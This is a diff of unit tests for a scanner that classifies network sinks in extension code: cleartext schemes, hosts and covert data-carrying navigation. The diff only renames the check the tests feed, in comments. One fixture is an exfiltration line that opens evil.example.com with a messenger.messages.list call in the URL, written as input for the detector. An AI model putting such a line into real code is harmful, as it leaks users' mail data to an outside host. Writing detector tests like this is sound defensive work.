@@ -1,7 +1,7 @@
 // Unit tests for the scheme (cleartext) and host fields scanNetworkSinks records
 // on each sink - the data the cleartext-transmission and privacy-policy checks
 // read - plus the covert-channel classification (the window-open / navigation sink
-// types and carriesData) the disguised-window / disguised-navigation checks gate on.
+// types and carriesData) the data-exfiltration check gates on.
 // The remaining channel/destClass field combinations are covered in rules.test.js
 // alongside the checks that consume them.
 
@@ -480,10 +480,9 @@ test("XHR with a dynamic method keeps its destination", () => {
   assert.equal(win.host, "popup.example.com");
 });
 
-// The two covert-navigation sinks the disguised-* checks consume: window.open and a
-// location.href assignment. carriesData is the flag that separates a STRONG exfil (a
-// user-data API call inside the URL) from an ordinary navigation, so it is asserted
-// both true (a messenger.messages.* call is present) and false (none is).
+// The two covert-navigation sinks the data-exfiltration check consumes: window.open and
+// a location.href assignment. carriesData marks a user-data API call inside the URL, so
+// it is asserted both true (a messenger.messages.* call is present) and false (none is).
 test("window.open carrying a data-API call is a covert, data-bearing sink", () => {
   const hit = one(
     'window.open("https://evil.example.com/?d=" + messenger.messages.list(id));'
